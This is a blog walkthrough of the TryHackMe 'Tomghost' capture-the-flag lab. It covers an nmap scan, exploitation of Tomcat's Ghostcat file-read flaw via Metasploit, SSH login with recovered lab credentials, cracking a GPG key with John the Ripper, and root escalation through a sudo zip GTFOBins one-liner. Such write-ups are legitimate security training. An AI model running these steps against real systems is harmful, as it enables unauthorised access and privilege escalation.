# Comprehensive Walkthrough Guide for TryHackMe Room: Tomghost

<p>The <strong>Tomghost</strong> room on TryHackMe is an excellent practical challenge that covers multiple stages of penetration testing, ranging from reconnaissance and service scanning to vulnerability exploitation and privilege escalation. Below is a complete step-by-step technical guide based on the workflow.</p>




<h2>
  
  
  1. Reconnaissance and Scanning
</h2>

<p>The process begins by scanning the target IP address using <strong>Nmap</strong> to identify open ports and active services. The scan results show:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="o">(</span>your ip<span class="o">)</span>
</code></pre>

</div>



<ul>
<li><p>Port <strong>22/tcp</strong> is open for <strong>SSH</strong> (OpenSSH 7.2p2).</p></li>
<li><p>Port <strong>53/tcp</strong> runs tcpwrapped.</p></li>
<li><p>Port <strong>8009/tcp</strong> is open for <strong>AJP13</strong> (Apache JServ Protocol).</p></li>
<li><p>Port <strong>8080/tcp</strong> is open for <strong>Apache Tomcat 9.0.30</strong>.</p></li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbjaq6l0w5bex137gqsw8.png"><img alt=" " height="406" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbjaq6l0w5bex137gqsw8.png" width="800" /></a></p>




<h2>
  
  
  2. Exploiting the Ghostcat Vulnerability (CVE-2020-1938)
</h2>

<p>Due to the presence of the AJP protocol on port 8009 and a compatible Tomcat version, the famous <strong>Ghostcat</strong> vulnerability allows file reading from the server:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>msfconsol
</code></pre>

</div>



<ul>
<li>Launching the <strong>Metasploit</strong> framework and searching for the AJP file read exploit module <code>auxiliary/admin/http/tomcat_ghostcat</code>.
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>msf&gt; search port:8009
</code></pre>

</div>



<ul>
<li><p>Setting the module options and targeting the default file <code>/WEB-INF/web.xml</code>.</p></li>
<li><p>Running the module successfully reveals the contents of the file, including the username <code>skyfuck</code> and password <code>8730281lkjlkjdqlksalks</code>.</p></li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fucqadxz3x6kae9c34r2p.png"><img alt=" " height="353" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fucqadxz3x6kae9c34r2p.png" width="674" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fpwqjns3vjiiqvwdlybn0.png"><img alt=" " height="274" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fpwqjns3vjiiqvwdlybn0.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Flho6tutjpdcglhi5q9rk.png"><img alt=" " height="457" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Flho6tutjpdcglhi5q9rk.png" width="800" /></a><br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>username : skyfuck 
password : 8730281lkjlkjdqlksalks
</code></pre>

</div>






<h2>
  
  
  3. Initial Access via SSH and Exploration
</h2>

<p>Using the credentials found inside the <code>web.xml</code> file, an SSH connection is established to access the system:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>ssh skyfuck@<span class="o">(</span>your ip<span class="o">)</span>
</code></pre>

</div>





<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>password : 8730281lkjlkjdqlksalks
</code></pre>

</div>



<ul>
<li><p>Navigating through directories, <code>user.txt</code> is located inside <code>/home/merlin</code>.</p></li>
<li><p>Two critical files are discovered: a GPG private key block named <code>tryhackme.asc</code> and an encrypted credential file named <code>credential.pgp</code>.</p></li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ff740rgbn2kng87xwwiyd.png"><img alt=" " height="453" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ff740rgbn2kng87xwwiyd.png" width="662" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1p896eccumaqwk5pstue.png"><img alt=" " height="219" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1p896eccumaqwk5pstue.png" width="351" /></a></p>

<p>user.txt<br />
THM{......................}<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">cat </span>tryhackme.asc
</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fg5g4y4guorpg5as7acch.png"><img alt=" " height="703" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fg5g4y4guorpg5as7acch.png" width="286" /></a></p>




<h2>
  
  
  4. Cracking the GPG Key with John the Ripper
</h2>

<p>To read the encrypted credentials, the GPG private key must be cracked first:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F3mduudyuw33cf8ikgji4.png"><img alt=" " height="48" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F3mduudyuw33cf8ikgji4.png" width="340" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj55wdxf27cye0jqz6n6o.png"><img alt=" " height="308" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj55wdxf27cye0jqz6n6o.png" width="800" /></a><br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nano 99.esc
</code></pre>

</div>



<ul>
<li>Converting the GPG key into a hash format readable by John the Ripper using <code>gpg2john 99.asc &gt; 99.txt</code>.
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>gpg2john 99.asc <span class="o">&gt;</span> 99.txt
</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbk8hdcun7d4n255anl20.png"><img alt=" " height="55" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbk8hdcun7d4n255anl20.png" width="300" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2in7lbe3uc4nz2utqp2x.png"><img alt=" " height="66" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2in7lbe3uc4nz2utqp2x.png" width="409" /></a></p>

<ul>
<li>Running <strong>John the Ripper</strong> with the popular <code>rockyou.txt</code> wordlist:
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>john 99.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fl2cpchmo3sm1savmoy27.png"><img alt=" " height="158" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fl2cpchmo3sm1savmoy27.png" width="799" /></a></p>

<ul>
<li>The tool successfully cracks the password, revealing it to be <code>alexandru</code>.</li>
</ul>




<h2>
  
  
  5. Decrypting Credentials and Switching Users
</h2>

<p>With the GPG passphrase recovered:</p>

<ul>
<li>The GPG key is imported using the command <code>gpg --import tryhackme.asc</code>.
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>gpg <span class="nt">--import</span> tryhackme.asc
</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ff9ev9w4ghcsbgxrv2n5m.png"><img alt=" " height="218" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ff9ev9w4ghcsbgxrv2n5m.png" width="800" /></a></p>

<ul>
<li>The encrypted credential file is decrypted using <code>gpg --decrypt credential.pgp</code> by entering the passphrase <code>alexandru</code>.
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>gpg <span class="nt">--decrypt</span> credential.pgp
</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fewazgklfyodfq3jjtb3n.png"><img alt=" " height="165" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fewazgklfyodfq3jjtb3n.png" width="756" /></a><br />
password : alexandru</p>

<ul>
<li>This process reveals the credentials for the user <strong>merlin</strong>.
</li>
</ul>
<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>su merlin
</code></pre>

</div>



<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>password : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
</code></pre>

</div>


<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fikrz5k4zhfvd8irtg8oq.png"><img alt=" " height="185" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fikrz5k4zhfvd8irtg8oq.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fej39k1ui7hmvm8norgsf.png"><img alt=" " height="52" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fej39k1ui7hmvm8norgsf.png" width="419" /></a><br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>username : merlin 
password : asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
</code></pre>

</div>






<h2>
  
  
  6. Privilege Escalation to Root
</h2>

<p>After logging in as the user <code>merlin</code>:</p>

<ul>
<li>Checking sudo privileges with <code>sudo -l</code> shows that the user is allowed to run the <strong><code>/usr/bin/zip</code></strong> utility as <code>root</code> without a password (<code>NOPASSWD</code>).
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fa0rxce11nfj6wgkhz7yx.png"><img alt=" " height="81" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fa0rxce11nfj6wgkhz7yx.png" width="797" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fvnydqhk323m9gpla6hyx.png"><img alt=" " height="36" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fvnydqhk323m9gpla6hyx.png" width="371" /></a></p>

<ul>
<li>Exploiting this misconfiguration using the GTFOBins technique for <code>zip</code>:
</li>
</ul>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span>
</code></pre>

</div>





<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo </span>zip <span class="nv">$TF</span> /etc/hosts <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'sh #'</span>

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F4levcnb6s2lvrp0wegkl.png"><img alt=" " height="115" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F4levcnb6s2lvrp0wegkl.png" width="664" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Foykvtdfv7p800ed67czh.png"><img alt=" " height="146" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Foykvtdfv7p800ed67czh.png" width="486" /></a></p>

<ul>
<li><p>This successfully bypasses restrictions and spawns an interactive shell with full <code>root</code> privileges (<code>uid=0(root)</code>).</p></li>
<li><p>Finally, navigating to the <code>/root</code> directory and reading <code>root.txt</code> retrieves the final flag to complete the room.</p></li>
</ul>

<p>root.txt<br />
THM{......................}</p>

[Read original article on DEV](https://dev.to/mohammadali_30/comprehensive-walkthrough-guide-for-tryhackme-room-tomghost-41fn)